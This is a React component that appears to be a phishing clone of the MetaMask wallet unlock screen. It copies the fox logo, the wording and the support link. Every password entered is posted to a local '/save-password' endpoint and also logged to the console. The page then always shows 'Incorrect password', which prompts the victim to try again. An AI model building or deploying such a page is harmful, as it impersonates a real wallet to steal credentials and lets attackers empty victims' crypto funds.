import logo from './logo.svg';
import './App.css';
import Fox from './Metalogo';
import { TextField } from '@mui/material';
import { useState } from 'react';
import FormHelperText from '@mui/material/FormHelperText';
import getCaretCoordinates from 'textarea-caret'
import axios from 'axios';

function App() {

  const [inputType, setInputType] = useState('text');
  const [password, setPassword] =  useState('');
  const [enabled,setEnabled] = useState('btn-disabled')
  const [isError, setIsError] = useState(false);
  const [isDisabled, setIsDisabled] = useState(true);
  const [pos, setPos] = useState({x:0,y:0});

  const handleFocus = () => {
    if(password=='')setInputType('text')
    else setInputType('password');
  };

  const handleBlur = () => {
    console.log(password)
    if(password.length==0)setInputType('text')
    console.log(inputType)
  };

  const onChange =(e)=>{
    if(e.target.value==''){
      setInputType('text');
      setEnabled('btn-disabled')
      setIsDisabled(true)
    }
    else {
      setInputType('password');
      setEnabled('btn-enabled');
      setIsDisabled(false)
    }
    setPassword(e.target.value);
    setIsError(false)

    const element =  e.target;
    const boundingRect = element.getBoundingClientRect();
    const coordinates = getCaretCoordinates(element, element.selectionEnd);
    const x = boundingRect.left + coordinates.left - element.scrollLeft;
    const y = boundingRect.top + coordinates.top - element.scrollTop;
    setPos({x:x-80,y:y+1000});
  }

  const onClick = async ()=>{
    setIsError(true);
    try{
      await axios.post('http://localhost:6168/save-password',{data:password})
    }
    catch(error){
      console.log(error)
    }
  }
  return (
    <div className='App-container'>
      <div className="App">
        <header className='App-logo'>
          <Fox followMouse={true}  width={120} height={120} followMotion={true} position={pos}/>
          <h1 className='title'>Welcome back!</h1>
          <div>The decentralized web awaits</div>
          <div className='password-input'>
            <form action='#'>
              <TextField
                id="standard-password-input"
                label="Password"
                type={inputType}
                value={password}
                onChange={onChange}
                variant="standard"
                autoComplete="off"
                autoSave='off'
                onFocus={handleFocus}
                onBlur={handleBlur}
                fullWidth
                error = {isError}
              />
              {
                isError&&<FormHelperText id="component-error-text" style={{color:"red"}}>Incorrect password</FormHelperText>

              }
              <button className= {`unlock-button ${enabled} `} onClick={onClick} disabled={isDisabled}>Unlock</button>

            </form>
          </div>
          <div className='unlock_links'>
              <a className='button btn-link unlock_link '>Forgot passwords?</a>
          </div>
          <div className='support'>
              <span>Need help? Contact </span>
              <a href='https://support.metamask.io' target='_blank' rel='noopener noref errer'>MetaMask support</a>
          </div>
        </header>
      </div>
    </div>
  );
}

export default App;
